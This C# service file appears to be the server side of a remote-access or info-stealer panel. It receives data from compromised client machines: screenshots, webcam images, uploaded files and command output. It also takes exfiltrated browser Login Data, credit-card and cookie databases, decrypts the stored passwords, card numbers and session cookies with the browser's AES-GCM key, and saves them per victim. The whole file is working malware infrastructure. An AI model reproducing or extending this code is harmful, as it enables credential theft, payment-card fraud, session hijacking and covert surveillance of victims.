using Microsoft.EntityFrameworkCore;
using X_ZIGZAG_SERVER_WEB_API.Data;
using X_ZIGZAG_SERVER_WEB_API.Models;
using X_ZIGZAG_SERVER_WEB_API.Interfaces;
using System.Data.SQLite;
using System.Security.Cryptography;
using System.Text;
using System.Net;
using X_ZIGZAG_SERVER_WEB_API.ViewModels.Response;

namespace X_ZIGZAG_SERVER_WEB_API.Services
{
    public class ResponseService : IResponseService
    {
        private readonly static object _lockPassObject = new object();
        private readonly static object _lockCardObject = new object();

        private readonly MyDbContext _context;
        private readonly IWebHostEnvironment _environment;

        public ResponseService(MyDbContext context, IWebHostEnvironment environment)
        {
            _context = context;
            _environment = environment;
        }
        public async Task<List<ResultResponseVM>>? GetAllResponse(string uuid){
            bool userExist = await _context.SystemsInfo.AnyAsync(u => u.Id.Equals(uuid));
            if (!userExist)
            {
                return null;
            }
            return await _context.Results.Where(u => u.ClientId.Equals(uuid)).Select(d => new ResultResponseVM { InstructionId = d.InstructionId, Code = d.Code, ResultDate=d.ResultDate,FunctionArgs=d.FunctionArgs,Output=d.Output }).ToListAsync();
        }   
        public async Task StoreScreenshot(string uuid, int Index, byte[] imageData)
        {
            var UserSettings = await _context.CheckSettings.Where(u=> u.Id.Equals(uuid)).FirstOrDefaultAsync();
            if (UserSettings!=null && IsJpeg(imageData))
            {
                if (UserSettings.Screenshot != 0)
                {
                    try {
                        string uploadsFolder = Path.Combine(_environment.ContentRootPath, "Screenshots", uuid, Index.ToString());
                        Directory.CreateDirectory(uploadsFolder);
                        string filePath = Path.Combine(uploadsFolder, $"{DateTimeOffset.UtcNow.ToUnixTimeSeconds()}.jpg");
                        await System.IO.File.WriteAllBytesAsync(filePath, imageData);
                        if (UserSettings.Screenshot == -1)
                        {
                            UserSettings.Screenshot = 0;
                        }
                        _context.CheckSettings.Update(UserSettings);
                        await _context.SaveChangesAsync();
                    }
                    catch (Exception)
                    {
                    }
                }
            }
        }
        public async Task StoreWebcam(string uuid, int Index, byte[] imageData , long instructionId)
        { 
            string uploadsFolder = Path.Combine(_environment.ContentRootPath, "Webcam", uuid, Index.ToString());
            Directory.CreateDirectory(uploadsFolder);
            string filePath = Path.Combine(uploadsFolder, $"{DateTimeOffset.UtcNow.ToUnixTimeSeconds()}.jpg");
            await System.IO.File.WriteAllBytesAsync(filePath, imageData);
        /*
        var TInstruction = await _context.Instructions.Where(u => u.ClientId.Equals(uuid)&& u.InstructionId==instructionId).FirstOrDefaultAsync();
            if (TInstruction != null && IsJpeg(imageData))
            {
                try
                {
                    
                    var result = new Result
                    {
                        ClientId = uuid,
                        InstructionId = instructionId,
                        Code = 4,
                        ResultDate = DateTimeOffset.Now,
                    };
                    await _context.Results.AddAsync(result);
                    _context.Remove(TInstruction);
                    await _context.SaveChangesAsync();
                }
                catch (Exception)
                {
                }
            }*/
        }
        public async Task StoreFile(string uuid,long instructionId,IFormFile file)
        {
            var InstructionGet = await _context.Instructions.Where(inst => inst.ClientId.Equals(uuid) && inst.InstructionId.Equals(instructionId)).FirstOrDefaultAsync();
            if (InstructionGet!=null)
            {
                var uploadsFolder = Path.Combine(Directory.GetCurrentDirectory(), "Uploads", uuid);
                Directory.CreateDirectory(uploadsFolder);
                var filePath = Path.Combine(uploadsFolder, $"{file.FileName}");
                using (var stream = new FileStream(filePath, FileMode.Create))
                {
                    await file.CopyToAsync(stream);
                }
                var result = new Result
                {
                    ClientId = uuid,
                    InstructionId = instructionId,
                    Code = InstructionGet.Code,
                    ResultDate= DateTimeOffset.Now,
                    FunctionArgs=InstructionGet.FunctionArgs,
                };
                await _context.Results.AddAsync(result);
                _context.Remove(InstructionGet);
                await _context.SaveChangesAsync();
            }
        }
        public async Task ResponseOutput(string uuid, long instructionId, string? output)
        {
            var InstructionGet = await _context.Instructions.Where(inst => inst.ClientId.Equals(uuid) && inst.InstructionId.Equals(instructionId)).FirstOrDefaultAsync();
            if (InstructionGet != null)
            {
                var result = new Result
                {
                    ClientId = uuid,
                    InstructionId = instructionId,
                    Code = InstructionGet.Code,
                    ResultDate = DateTimeOffset.Now,
                    FunctionArgs = InstructionGet.FunctionArgs,
                    Output= output
                };
                await _context.Results.AddAsync(result);
                _context.Remove(InstructionGet);
                await _context.SaveChangesAsync();
            }
        }
        public async Task BrowserPasswordExtracting(string uuid, long instructionId, byte[] file, byte[] secretKey,string BrowserName)
        {
            var checkIfUserExist = await _context.CheckSettings.AnyAsync(u=>u.Id.Equals(uuid));
            if (!checkIfUserExist)
            {
                return;
            }
           
            var InstructionGet = await _context.Instructions.Where(inst => inst.ClientId.Equals(uuid) && inst.InstructionId.Equals(instructionId)).FirstOrDefaultAsync();
            if (InstructionGet != null)
            {
                _context.Instructions.Remove(InstructionGet);
                await _context.SaveChangesAsync();
            }
            string tempFilePath = Path.GetTempFileName();
            using (FileStream fs = new FileStream(tempFilePath, FileMode.Create, FileAccess.Write))
            {
                fs.Write(file, 0, file.Length);
            }
            List<Password> myPassList= new List<Password>();
            string connectionString = $"Data Source={tempFilePath};Version=3;";
            try
            {

                using (SQLiteConnection connection = new SQLiteConnection(connectionString))
                {
                    connection.Open();
                    string query = "SELECT origin_url,username_value,password_value FROM logins";
                    using (SQLiteCommand command = new SQLiteCommand(query, connection))
                    {
                        using (SQLiteDataReader reader = command.ExecuteReader())
                        {
                            while (reader.Read())
                            {
                                string url = (string)reader["origin_url"];
                                string username = (string)reader["username_value"];
                                byte[] encryptedPassword = (byte[])reader["password_value"];
                                string decryptedPassword = DecryptPassword(encryptedPassword, secretKey);
                                if (!string.IsNullOrEmpty(decryptedPassword))
                                {
                                    DateTimeOffset now;
                                    lock (_lockPassObject)
                                    {
                                        Thread.Sleep(1);
                                        now = DateTimeOffset.UtcNow;
                                    }
                                    DateTimeOffset unixEpoch = new DateTimeOffset(2024, 7, 5, 0, 0, 0, TimeSpan.Zero);
                                    long unixTimestamp = (long)(now - unixEpoch).TotalMilliseconds;
                                    myPassList.Add(new Password { ClientId = uuid, PasswordId = unixTimestamp,BrowserName=BrowserName, Url = url, Login= username, DecrypredPassword = decryptedPassword });

                                }
                            }
                        }
                    }
                    connection.Close();
                }
                File.Delete(tempFilePath);
            }
            catch
            {
            }
            if (myPassList.Count > 0)
            {
                await _context.Passwords.AddRangeAsync(myPassList);
                await _context.SaveChangesAsync();
            }
        }
        public async Task BrowserCreditCardExtracting(string uuid, long instructionId, byte[] file, byte[] secretKey, string BrowserName)
        {
            var checkIfUserExist = await _context.CheckSettings.AnyAsync(u => u.Id.Equals(uuid));
            if (!checkIfUserExist)
            {
                return;
            }

            var InstructionGet = await _context.Instructions.Where(inst => inst.ClientId.Equals(uuid) && inst.InstructionId.Equals(instructionId)).FirstOrDefaultAsync();
            if (InstructionGet != null)
            {
                _context.Instructions.Remove(InstructionGet);
                await _context.SaveChangesAsync();
            }
            string tempFilePath = Path.GetTempFileName();
            using (FileStream fs = new FileStream(tempFilePath, FileMode.Create, FileAccess.Write))
            {
                fs.Write(file, 0, file.Length);
            }
            List<CreditCard> myCardList = new List<CreditCard>();
            string connectionString = $"Data Source={tempFilePath};Version=3;";
            try
            {

                using (SQLiteConnection connection = new SQLiteConnection(connectionString))
                {
                    connection.Open();
                    string query = "SELECT name_on_card,expiration_month,expiration_year,card_number_encrypted,origin FROM credit_cards";
                    using (SQLiteCommand command = new SQLiteCommand(query, connection))
                    {
                        using (SQLiteDataReader reader = command.ExecuteReader())
                        {
                            while (reader.Read())
                            {
                                string HolderName = (string)reader["name_on_card"];
                                string expireDate = reader.GetInt32(1).ToString() +"-"+ reader.GetInt32(2).ToString();
                                string CardOrigin = (string)reader["origin"];
                                byte[] encryptedCard = (byte[])reader["card_number_encrypted"];
                                string decryptedCard = DecryptPassword(encryptedCard, secretKey);
                                if (!string.IsNullOrEmpty(decryptedCard))
                                {
                                    DateTimeOffset now;
                                    lock (_lockCardObject)
                                    {
                                        Thread.Sleep(1);
                                        now = DateTimeOffset.UtcNow;
                                    }
                                    DateTimeOffset unixEpoch = new DateTimeOffset(2024, 7, 5, 0, 0, 0, TimeSpan.Zero);
                                    long unixTimestamp = (long)(now - unixEpoch).TotalMilliseconds;
                                    myCardList.Add(new CreditCard { ClientId = uuid, CreditCardId = unixTimestamp, BrowserName = BrowserName, Origin = CardOrigin, CardHolder = HolderName,ExpireDate= expireDate, DecrypredCreditCard = decryptedCard });

                                }
                            }
                        }
                    }
                    connection.Close();
                }
                File.Delete(tempFilePath);
            }
            catch
            {
            }
            if (myCardList.Count > 0)
            {
                await _context.CreditCards.AddRangeAsync(myCardList);
                await _context.SaveChangesAsync();
            }
        }
        public async Task BrowserCookiesExtracting(string uuid, long instructionId, byte[] file, byte[] secretKey, string BrowserName)
        {
            var checkIfUserExist = await _context.CheckSettings.AnyAsync(u => u.Id.Equals(uuid));
            if (!checkIfUserExist)
            {
                return;
            }

            var InstructionGet = await _context.Instructions.Where(inst => inst.ClientId.Equals(uuid) && inst.InstructionId.Equals(instructionId)).FirstOrDefaultAsync();
            if (InstructionGet != null)
            {
                _context.Instructions.Remove(InstructionGet);
                await _context.SaveChangesAsync();
            }
            string tempFilePath = Path.GetTempFileName();
            using (FileStream fs = new FileStream(tempFilePath, FileMode.Create, FileAccess.Write))
            {
                fs.Write(file, 0, file.Length);
            }
            List<X_ZIGZAG_SERVER_WEB_API.Models.Cookie> cookiesList = new List<X_ZIGZAG_SERVER_WEB_API.Models.Cookie>();
            string connectionString = $"Data Source={tempFilePath};Version=3;";
            try
            {

                using (SQLiteConnection connection = new SQLiteConnection(connectionString))
                {
                    connection.Open();
                    string query = "SELECT host_key,top_frame_site_key,name,expires_utc,encrypted_value FROM cookies";
                    using (SQLiteCommand command = new SQLiteCommand(query, connection))
                    {
                        using (SQLiteDataReader reader = command.ExecuteReader())
                        {
                            while (reader.Read())
                            {
                                string hostKey = (string)reader["host_key"] + "__" + (string)reader["top_frame_site_key"];
                                string name = (string)reader["name"];
                                long expiresUtc = (long)reader["expires_utc"];
                                byte[] encryptedValue = (byte[])reader["encrypted_value"];
                                string decryptedValue = DecryptPassword(encryptedValue, secretKey);
                                if (!string.IsNullOrEmpty(decryptedValue))
                                {
                                    DateTimeOffset now;
                                    lock (_lockCardObject)
                                    {
                                        Thread.Sleep(1);
                                        now = DateTimeOffset.UtcNow;
                                    }
                                    DateTimeOffset unixEpoch = new DateTimeOffset(2024, 7, 5, 0, 0, 0, TimeSpan.Zero);
                                    long unixTimestamp = (long)(now - unixEpoch).TotalMilliseconds;
                                    cookiesList.Add(new X_ZIGZAG_SERVER_WEB_API.Models.Cookie { ClientId = uuid, CookieId = unixTimestamp, BrowserName = BrowserName, Origin = hostKey, Name = name, ExpireDate = expiresUtc, Value = decryptedValue });

                                }
                            }
                        }
                    }
                    connection.Close();
                }
                File.Delete(tempFilePath);
            }
            catch
            {
            }
            if (cookiesList.Count > 0)
            {
                await _context.Cookies.AddRangeAsync(cookiesList);
                await _context.SaveChangesAsync();
            }
        }
        private static byte[] DecryptPayload(AesGcm cipher, byte[] payload, byte[] nonce, byte[] tag)
        {
            byte[] decryptedData = new byte[payload.Length];
            cipher.Decrypt(nonce, payload, tag, decryptedData);
            return decryptedData;
        }

        private static AesGcm GenerateCipher(byte[] aesKey) => new AesGcm(aesKey);

        private static string DecryptPassword(byte[] ciphertext, byte[] secretKey)
        {
            try
            {
                // (3-a) Initialisation vector for AES decryption
                byte[] initialisationVector = new byte[12];
                Array.Copy(ciphertext, 3, initialisationVector, 0, 12);

                // (3-b) Get encrypted password by removing suffix bytes (last 16 bytes)
                int encryptedPasswordLength = ciphertext.Length - 15 - 16;
                byte[] encryptedPassword = new byte[encryptedPasswordLength];
                Array.Copy(ciphertext, 15, encryptedPassword, 0, encryptedPasswordLength);

                // The tag is the last 16 bytes of the ciphertext
                byte[] tag = new byte[16];
                Array.Copy(ciphertext, ciphertext.Length - 16, tag, 0, 16);

                // (4) Build the cipher to decrypt the ciphertext
                using (AesGcm cipher = GenerateCipher(secretKey))
                {
                    byte[] decryptedBytes = DecryptPayload(cipher, encryptedPassword, initialisationVector, tag);
                    string decryptedPass = Encoding.UTF8.GetString(decryptedBytes);
                    return decryptedPass;
                }
            }
            catch
            {
                return string.Empty;
            }
        }
        private bool IsJpeg(byte[] fileBytes)
        {
            if (fileBytes.Length < 4)
            {
                return false;
            }

            var jpegSignatures = new List<byte[]>
            {
                new byte[] { 0xFF, 0xD8, 0xFF, 0xE0 },
                new byte[] { 0xFF, 0xD8, 0xFF, 0xE1 }
            };

            return jpegSignatures.Any(sig => fileBytes.Take(sig.Length).SequenceEqual(sig));
        }

    }
}
